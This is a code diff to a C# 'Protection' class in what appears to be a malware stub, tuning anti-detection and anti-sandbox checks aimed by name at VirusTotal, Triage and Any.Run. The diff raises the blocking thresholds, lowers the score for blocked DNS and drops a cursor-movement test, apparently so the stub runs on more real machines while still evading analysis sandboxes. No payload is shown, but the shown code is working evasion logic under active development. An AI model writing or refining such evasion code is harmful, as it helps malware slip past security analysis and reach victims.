@@ -1311,10 +1311,10 @@ internal static partial class Protection
         }
         catch { }
 
-        if (score >= 3)
-            StubLog.Info($"[AntiDetect] BLOCKED — score={score} (threshold=3)");
+        if (score >= 4)
+            StubLog.Info($"[AntiDetect] BLOCKED — score={score} (threshold=4)");
 
-        return score >= 3;
+        return score >= 4;
     }
 
     // â"€â"€ Anti-Sandbox (VirusTotal / Triage / Any.Run) â"€
@@ -1433,8 +1433,8 @@ internal static partial class Protection
         }
         catch
         {
-            score += 2; // DNS completely blocked
-            StubLog.Info("[AntiSandbox] DNS blocked (+2)");
+            score += 1; // DNS blocked — +1 only (corporate networks can also block it)
+            StubLog.Info("[AntiSandbox] DNS blocked (+1)");
         }
 
         // Process count — VT/Any.Run VMs have very few processes (< 30)
@@ -1451,17 +1451,6 @@ internal static partial class Protection
         }
         catch { }
 
-        // Cursor entropy — sandboxes keep a static/zero cursor position
-        try
-        {
-            GetCursorPos(out var p0);
-            Thread.Sleep(600);
-            GetCursorPos(out var p1);
-            if (p0.X == p1.X && p0.Y == p1.Y)
-                score++;
-        }
-        catch { }
-
         // Desktop file count — VT/Any.Run desktops are empty or near-empty
         try
         {
@@ -1471,10 +1460,10 @@ internal static partial class Protection
         }
         catch { }
 
-        if (score >= 3)
-            StubLog.Info($"[AntiSandbox] BLOCKED — score={score} (threshold=3)");
+        if (score >= 5)
+            StubLog.Info($"[AntiSandbox] BLOCKED — score={score} (threshold=5)");
 
-        return score >= 3;
+        return score >= 5;
     }
 }
 
